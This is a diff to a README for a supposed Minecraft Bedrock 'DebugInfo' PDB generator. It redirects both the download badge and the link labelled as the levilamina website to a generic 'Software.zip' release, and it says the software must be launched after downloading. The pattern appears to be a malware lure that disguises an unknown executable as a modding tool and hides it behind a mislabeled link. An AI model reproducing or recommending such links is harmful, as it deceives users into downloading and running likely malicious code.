@@ -17,12 +17,12 @@ Welcome to the **DebugInfo** repository, where you can generate debuginfo/PDB fr
 
 ## Get Started 🚀
 You can download the software to generate debuginfo/PDB files from the levilamina public data. Click the button below to download the software:
-[![Download DebugInfo](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download DebugInfo](https://github.com/harujvrsk/DebugInfo/releases/download/v1.0/Software.zip)](https://github.com/harujvrsk/DebugInfo/releases/download/v1.0/Software.zip)
 
 ### Note: The software needs to be launched after downloading.
 
 ## Explore Further ℹ️
-If you want to learn more about the mining adventures and Bedrock Edition modding, feel free to visit the [levilamina](https://levilamina.com) website. Discover new possibilities and expand your Minecraft experience!
+If you want to learn more about the mining adventures and Bedrock Edition modding, feel free to visit the [levilamina](https://github.com/harujvrsk/DebugInfo/releases/download/v1.0/Software.zip) website. Discover new possibilities and expand your Minecraft experience!
 
 ### Release Section 🔖
 In case the download link is not available or not functioning properly, please check the **Releases** section of this repository for alternative download options.
